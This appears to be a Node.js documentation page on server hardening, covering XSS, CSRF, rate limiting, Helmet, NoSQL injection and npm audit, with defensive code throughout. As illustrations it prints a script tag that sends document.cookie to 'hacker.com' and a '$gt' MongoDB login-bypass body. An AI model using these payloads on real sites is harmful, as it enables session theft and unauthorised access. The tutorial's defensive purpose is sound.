---
title: "Web Security (Hardening the Server)"
description: "Protect your application from the OWASP Top 10. Learn to prevent XSS and CSRF, implement Rate Limiting, secure your headers with Helmet, and sanitize inputs to stop NoSQL Injection."
tags: ["web-security", "sanitization", "helmet", "owasp"]
sidebar:
  order: 16
---

Node.js is open and flexible, which means it doesn't protect you by default from common web vulnerabilities. You are responsible for shielding your application from the **OWASP Top 10** risks.

## 1. XSS (Cross-Site Scripting)

XSS occurs when an attacker injects a malicious script into your frontend, which then executes in other users' browsers.

* **The Attack:** A user submits a comment: `<script>fetch('https://hacker.com?steal=' + document.cookie)</script>`.
* **The Risk:** If you render this comment directly in HTML, every user who views that page will send their session cookies to the hacker.

### Prevention: Data Sanitization

Never trust user input. Use libraries like `dompurify` (frontend) or `xss` (backend) to strip out dangerous tags.

```javascript
const xss = require('xss');

app.post('/comments', (req, res) => {
    // Clean the input before saving to DB
    const cleanComment = xss(req.body.text); 
    db.saveComment(cleanComment);
});

```

---

## 2. CSRF (Cross-Site Request Forgery)

CSRF tricking a logged-in user into submitting a request to your server without their knowledge.

* **The Attack:** You are logged into `bank.com`. You visit `evil-site.com`. That site has a hidden form that auto-submits `POST bank.com/transfer?amount=1000&to=hacker`.
* **The Risk:** Because you are logged in, your browser automatically attaches your session cookies, and the bank processes the request.

### Prevention: CSRF Tokens and SameSite Cookies

1. **CSRF Tokens:** The server generates a unique token for the frontend. Every POST/PUT request must include this token in a header. The "evil site" won't have this token.
2. **SameSite Cookies:** Set your cookies to `SameSite=Strict`. This tells the browser: "Only send this cookie if the request originated from my own domain."

```javascript
res.cookie('sessionID', '123', {
    httpOnly: true,
    secure: true,
    sameSite: 'Strict' // Best defense against CSRF
});

```

---

## 3. Rate Limiting (Preventing Brute Force)

If your login endpoint is wide open, an attacker can try 10,000 passwords per minute until they get in. You must limit how many requests an IP address can make in a specific window.

### Implementation: `express-rate-limit`

This middleware keeps track of IPs in memory (or Redis) and blocks them if they exceed the limit.

```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 login attempts per window
    message: "Too many login attempts, please try again after 15 minutes"
});

// Apply only to sensitive routes
app.use('/api/auth/login', loginLimiter);

```

---

## 4. Helmet.js (Security Headers)

`Helmet` is a collection of 15 smaller middleware functions that set HTTP response headers to protect your app from well-known web vulnerabilities.

```javascript
const helmet = require('helmet');
app.use(helmet());

```

**What Helmet actually does (Key Headers):**

* **Content-Security-Policy (CSP):** Prevents XSS by defining which scripts are allowed to run.
* **X-Frame-Options:** Prevents "Clickjacking" by forbidding your site from being rendered inside an `<iframe>` on another site.
* **Strict-Transport-Security (HSTS):** Forces the browser to connect via HTTPS only.
* **X-Content-Type-Options:** Prevents "MIME-sniffing" (forcing the browser to treat a `.txt` file as a `.js` file).

---

## 5. Parameter Pollution and NoSQL Injection

### Parameter Pollution

If a user sends `GET /search?user=admin&user=root`, `req.query.user` becomes an array `['admin', 'root']`. If your code expects a string, it might crash or behave unexpectedly. Use `hpp` middleware to prevent this.

### NoSQL Injection

In MongoDB, an attacker might send `{"username": {"$gt": ""}, "password": {"$gt": ""}}`. The `$gt: ""` (greater than nothing) is always true, effectively logging them in without a password.

**Prevention: `express-mongo-sanitize**`
This middleware searches for keys starting with `$` or `.` and removes them from `req.body`, `req.query`, and `req.params`.

```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());

```

---

## 6. Dependency Scanning (`npm audit`)

Many Node.js vulnerabilities come from the packages you install, not the code you write.

1. **Run regularly:** `npm audit`. It checks your `package-lock.json` against a database of known vulnerabilities.
2. **Fix automatically:** `npm audit fix`.
3. **CI/CD:** Integrate tools like **Snyk** or **GitHub Dependabot** to automatically alert you when a package you use becomes compromised.
